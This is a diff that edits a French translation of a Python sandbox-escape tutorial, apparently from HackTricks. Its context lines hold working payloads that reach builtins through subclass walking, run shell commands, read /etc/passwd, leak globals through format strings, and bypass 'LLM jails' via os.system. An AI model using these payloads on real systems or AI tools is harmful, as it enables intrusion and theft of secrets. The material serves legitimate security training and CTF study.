@@ -358,7 +358,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Ci-dessous, il y a une plus grande fonction**](./#recursive-search-of-builtins-globals) pour trouver des dizaines/**centaines** de **lieux** où vous pouvez trouver les **builtins**.
+[**Ci-dessous, il y a une plus grande fonction**](#recursive-search-of-builtins-globals) pour trouver des dizaines/**centaines** de **lieux** où vous pouvez trouver les **builtins**.
 
 #### Python2 et Python3
 ```python
@@ -366,7 +366,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Charges utiles intégrées
+### Payloads intégrés
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -400,7 +400,7 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Ci-dessous, il y a une plus grande fonction**](./#recursive-search-of-builtins-globals) pour trouver des dizaines/**centaines** de **lieux** où vous pouvez trouver les **globals**.
+[**Ci-dessous, il y a une plus grande fonction**](#recursive-search-of-builtins-globals) pour trouver des dizaines/**centaines** de **lieux** où vous pouvez trouver les **globals**.
 
 ## Découvrir l'exécution arbitraire
 
@@ -537,7 +537,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Recherche Récursive des Builtins, Globals...
 
 > [!WARNING]
-> C'est juste **incroyable**. Si vous **cherchez un objet comme globals, builtins, open ou autre**, utilisez simplement ce script pour **trouver de manière récursive des endroits où vous pouvez trouver cet objet.**
+> C'est juste **incroyable**. Si vous **cherchez un objet comme globals, builtins, open ou autre**, utilisez simplement ce script pour **trouver de manière récursive les endroits où vous pouvez trouver cet objet.**
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -659,7 +659,7 @@ Vous pouvez vérifier la sortie de ce script sur cette page :
 https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
 {{#endref}}
 
-## Format de chaîne Python
+## Chaîne de format Python
 
 Si vous **envoyez** une **chaîne** à python qui va être **formatée**, vous pouvez utiliser `{}` pour accéder à **l'information interne de python.** Vous pouvez utiliser les exemples précédents pour accéder aux globals ou aux builtins par exemple.
 ```python
@@ -681,11 +681,11 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et **élément dict** avec **parenthèses** sans guillemets `__globals__[CONFIG]`
+Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et **élément de dict** avec **parenthèses** sans guillemets `__globals__[CONFIG]`
 
 Notez également que vous pouvez utiliser `.__dict__` pour énumérer les éléments d'un objet `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Certaines autres caractéristiques intéressantes des chaînes de format sont la possibilité d'**exécuter** les **fonctions** **`str`**, **`repr`** et **`ascii`** dans l'objet indiqué en ajoutant **`!s`**, **`!r`**, **`!a`** respectivement :
+Certaines autres caractéristiques intéressantes des chaînes de format sont la possibilité d'**exécuter** les **fonctions** **`str`**, **`repr`** et **`ascii`** sur l'objet indiqué en ajoutant **`!s`**, **`!r`**, **`!a`** respectivement :
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -701,10 +701,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Plus d'exemples** sur les **exemples** de **chaîne de format** peuvent être trouvés sur [**https://pyformat.info/**](https://pyformat.info)
+**Plus d'exemples** sur les **exemples de chaînes de format** peuvent être trouvés sur [**https://pyformat.info/**](https://pyformat.info)
 
 > [!AVERTISSEMENT]
-> Vérifiez également la page suivante pour des gadgets qui r**écupéreront des informations sensibles à partir des objets internes de Python** :
+> Vérifiez également la page suivante pour des gadgets qui vont r**écupérer des informations sensibles à partir des objets internes de Python** :
 
 {{#ref}}
 ../python-internal-read-gadgets.md
@@ -726,17 +726,17 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### Contournement des LLM Jails
+### Contournement des prisons LLM
 
 Depuis [ici](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
 ### Du format à l'exécution de code à distance en chargeant des bibliothèques
 
-Selon le [**TypeMonkey chall de cet article**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
+Selon le [**challenge TypeMonkey de cet article**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
 
 En rappel, chaque fois qu'une action est effectuée en python, une fonction est exécutée. Par exemple, `2*3` exécutera **`(2).mul(3)`** ou **`{'a':'b'}['a']`** sera **`{'a':'b'}.__getitem__('a')`**.
 
-Vous en avez plus comme cela dans la section [**Exécution Python sans appels**](./#python-execution-without-calls).
+Vous en avez d'autres comme cela dans la section [**Exécution Python sans appels**](#python-execution-without-calls).
 
 Une vulnérabilité de chaîne de format python ne permet pas d'exécuter une fonction (elle ne permet pas d'utiliser des parenthèses), donc il n'est pas possible d'obtenir une exécution de code à distance comme `'{0.system("/bin/sh")}'.format(os)`.\
 Cependant, il est possible d'utiliser `[]`. Par conséquent, si une bibliothèque python courante a une méthode **`__getitem__`** ou **`__getattr__`** qui exécute du code arbitraire, il est possible de les abuser pour obtenir une exécution de code à distance.
@@ -774,7 +774,7 @@ Le défi abuse en réalité d'une autre vulnérabilité sur le serveur qui perme
 > [!NOTE]
 > Si vous voulez **apprendre** sur le **bytecode python** en profondeur, lisez ce **superbe** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-Dans certains CTF, vous pourriez recevoir le nom d'une **fonction personnalisée où le flag** réside et vous devez examiner les **internes** de la **fonction** pour l'extraire.
+Dans certains CTFs, vous pourriez recevoir le nom d'une **fonction personnalisée où le flag** réside et vous devez examiner les **internes** de la **fonction** pour l'extraire.
 
 C'est la fonction à inspecter :
 ```python
@@ -805,7 +805,7 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Voir ici plus d'endroits pour obtenir des globals**](./#globals-and-locals)
+[**Voir ici plus d'endroits pour obtenir des globals**](#globals-and-locals)
 
 ### **Accéder au code de la fonction**
 
@@ -897,7 +897,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables en cours de chargement (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable en cours de chargement.
+Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables étant chargées (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable étant chargée.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -957,18 +957,18 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 > [!NOTE]
-> Selon la version de Python, les **paramètres** de `code_type` peuvent avoir un **ordre différent**. La meilleure façon de connaître l'ordre des paramètres dans la version de Python que vous exécutez est de lancer :
+> Selon la version de Python, les **paramètres** de `code_type` peuvent avoir un **ordre différent**. La meilleure façon de connaître l'ordre des paramètres dans la version de Python que vous exécutez est d'exécuter :
 >
 > ```
 > import types
 > types.CodeType.__doc__
-> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCréer un objet code.  Pas pour les âmes sensibles.'
+> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 > ```
 
 ### Recréer une fonction divulguée
 
 > [!WARNING]
-> Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce que **vous devrez divulguer**.
+> Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet de code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce que **vous devrez divulguer**.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -981,7 +981,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout le reste en une **ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
+Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout dans une **ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
 Quoi qu'il en soit, parfois il pourrait être utile de **créer** un **objet compilé** sur une machine locale et de l'exécuter sur la **machine CTF** (par exemple parce que nous n'avons pas la fonction `compiled` dans le CTF).
 
 Par exemple, compilons et exécutons manuellement une fonction qui lit _./poc.py_:
